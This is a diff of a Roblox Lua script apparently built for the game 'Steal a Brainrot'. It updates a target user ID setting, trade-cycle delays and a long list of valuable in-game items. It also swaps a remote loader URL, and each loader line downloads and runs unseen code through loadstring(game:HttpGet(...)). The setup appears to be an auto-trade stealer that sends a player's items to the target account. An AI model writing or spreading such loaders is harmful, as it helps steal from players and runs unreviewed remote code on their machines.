@@ -3,7 +3,6 @@ getgenv().TARGET_ID = 6219924104
 getgenv().DELAY_STEP = 1      
 getgenv().TRADE_CYCLE_DELAY = 2
 getgenv().TARGET_BRAINROTS = {
-    ["Foxini Lanternini"] = true,
     ["Strawberry Elephant"] = true,
     ["Meowl"] = true,
     ["Headless Horseman"] = true,
@@ -14,21 +13,27 @@ getgenv().TARGET_BRAINROTS = {
     ["Dragon Cannelloni"] = true,
     ["Love Love Bear"] = true,
     ["La Supreme Combinasion"] = true,
+    ["Hydra Bunny"] = true,
     ["Celestial Pegasus"] = true,
     ["Cerberus"] = true,
+    ["Bunny and Eggy"] = true,
     ["Popcuru and Fizzuru"] = true,
     ["Rosey and Teddy"] = true,
     ["Capitano Moby"] = true,
     ["Cooki and Milki"] = true,
     ["Burguro And Fryuro"] = true,
+    ["Arcadragon"] = true,
     ["Ketupat Bros"] = true,
     ["Reinito Sleighito"] = true,
     ["Fortunu and Cashuru"] = true,
     ["Los Amigos"] = true,
     ["La Secret Combinasion"] = true,
+    ["Pancake and Syrup"] = true,
+    ["Foxini Lanternini"] = true,
     ["Los Sekolahs"] = true,
     ["Signore Carapace"] = true,
     ["La Casa Boo"] = true,
+    ["Cash or Card"] = true,
     ["Fragrama and Chocrama"] = true,
     ["La Food Combinasion"] = true,
     ["Elefanto Frigo"] = true,
@@ -37,25 +42,23 @@ getgenv().TARGET_BRAINROTS = {
     ["Sammyni Fattini"] = true,
     ["Festive 67"] = true,
     ["Cloverat Clapat"] = true,
+    ["Antonio"] = true,
     ["Garama and Madundung"] = true,
     ["Fishino Clownino"] = true,
-    ["Tirilikalika Tirilikalako"] = true,
-    ["La Ginger Sekolah"] = true,
-    ["Los Spaghettis"] = true,
-    ["Antonio"] = true,
     ["Jolly Jolly Sahur"] = true,
-    ["Dug dug dug"] = true,
-    ["Lovin Rose"] = true,
-    ["Fragola La La La"] = true,
-    ["Hydra Bunny"] = true,
-    ["Bunny and Eggy"] = true,
-    ["Arcadragon"] = true,
-    ["Pancake and Syrup"] = true,
-    ["Cash or Card"] = true,
-    ["Rico Dinero"] = true
+    ["Tirilikalika Tirilikalako"] = true,
+    ["Swaggy Bros"] = true,
+    ["Chillin Chili"] = true,
+    ["Los Chillis"] = true,
+    ["Digi Narwhal"] = true,
+    ["Kalika Bros"] = true,
+    ["Gym Bros"] = true,
+    ["Hopilikalika Hopilikalako"] = true,
+    ["Centrucci Nuclucci"] = true,
+    ["Fragola La La La"] = true
 }
 task.spawn(function()
-loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dadas45845/limitedhublph/refs/heads/main/morreira"))()
 end)
 task.spawn(function()
 loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/72bdd0e2a92a3d6de5c85f3672cb06c6a948f4fa24c0d2a3fc91585ee910f726/download"))()
